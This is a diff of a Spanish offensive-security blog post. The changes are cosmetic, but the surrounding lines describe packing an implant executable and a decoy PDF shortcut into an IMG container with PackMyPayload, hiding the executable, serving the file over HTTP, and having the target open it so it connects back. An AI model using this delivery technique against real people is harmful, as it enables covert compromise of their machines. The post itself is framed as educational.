@@ -82,7 +82,7 @@ Añado los ficheros a una carpeta.
 ```bash
 ls -l 
 total 100
--rw-r--r-- 1 root  root  80384 Jun  5 16:22 agent.x64.exe
+-rw-r--r-- 1 n1kto  n1kto  80384 Jun  5 16:22 agent.x64.exe
 -rw-rw-r-- 1 n1kto n1kto 13264 Jun  5  2025 Documento.pdf
 -rw-rw-r-- 1 n1kto n1kto  1859 Jun  5  2025 Documento.pdf.lnk
 ```
@@ -93,7 +93,7 @@ Y los empaqueto en un fichero con formato IMG ocultando agent.64.exe y Documento
 python3 PackMyPayload.py -H agent.64.exe,Documento.pdf ~/Desktop/container ~/Desktop/container/package.img
 ```
 
-# Envió y ejecución
+## Envió y ejecución
 
 Por ultimo transferimos nuestro fichero generado a la maquina objetivo levantando un servidor con python:
 
@@ -116,3 +116,4 @@ Abrimos package.img y abrimos el fichero que contiene produciendo así la conexi
 ![image.png](image%2010.png)
 
 Recuerdo que este post es con fines educativos y éticos y no se debe emplear para fines ilegales.
+
